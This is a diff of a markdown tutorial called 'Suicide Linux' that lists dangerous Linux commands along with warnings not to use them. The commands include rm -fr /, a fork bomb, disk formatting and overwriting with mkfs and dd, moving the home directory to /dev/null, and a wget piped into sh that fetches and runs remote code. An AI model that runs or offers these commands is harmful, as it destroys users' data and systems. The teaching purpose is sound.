@@ -3,56 +3,56 @@ Suicide Linux
 
 *Simple list of deadly linux commands. All the Linux that nobody will teach you, but that you will experience in first person. At least one time in your life.*
 
-## Warning
+## Warning!!
 Most of the commands in this tutorial are **really dangerous**!!!
 DO NOT use these commands on a real system if you have no idea of what you are going to do.
 
 
-### Delete Everything!
+#### Delete Everything!
 
 `rm -fr /`
 
 With this command you asking to delete every files in your disk. Your only hope is that some security control will denied you to do something so silly.
 
 
-### Fork Bomb
+#### Fork Bomb
 
 `:(){ :|: & };:`
 
 Elegant and deadly as a dark-lady. This short shell script replicates itself until all the processing capabilities of your computer will be occupied. Shutdown and restart seems to be the only solution.
 
 
-### Format the Drive
+#### Format the Drive
 
 `mkfs.ext4 /dev/sda1`
 
-Do you remember `format C:` of the old DOS? this have the same result.
+Do you remember `FORMAT C:` of the old DOS? this have the same result.
 
-### Right Time, but Wrong Place
+#### Right Time, but Wrong Place
 
 `date > /dev/sda`
 
 Redirecting will write raw bytes on your disk partition. What can never will be? nothing good! surely.
 
 
-## Collect Junk is a Dirty Job
+#### Collect Junk is a Dirty Job
 
 `dd if=/dev/random of=/dev/sda`
 
 
-## Have to start again
+#### Have to start again
 
 `mv ~ /dev/null`
 
 This command will move all your personal data in the Linux equivalent of a Black Hole.
 
 
-## Stranger Danger
+#### Stranger Danger
 
 `wget http://example.com/something -O – | sh –`
 
 
-## You will be no more busy
+#### You will be no more busy
 
 `rm -f /usr/sbin/busybox`
 
